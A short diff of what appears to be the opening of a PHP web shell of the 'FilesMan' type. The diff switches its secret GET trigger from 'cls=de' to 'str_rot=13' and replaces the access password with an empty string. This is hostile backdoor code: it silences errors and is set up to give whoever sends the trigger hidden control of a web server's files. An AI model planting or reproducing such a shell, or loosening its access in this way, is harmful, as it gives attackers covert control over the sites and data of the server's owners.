@@ -1,6 +1,6 @@
 <?php error_reporting(0); 
-if($_GET['cls'] == 'de')
-{$auth_pass = "fxngk";
+if($_GET['str_rot'] == '13')
+{$auth_pass = "";
 $color = "#df5";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
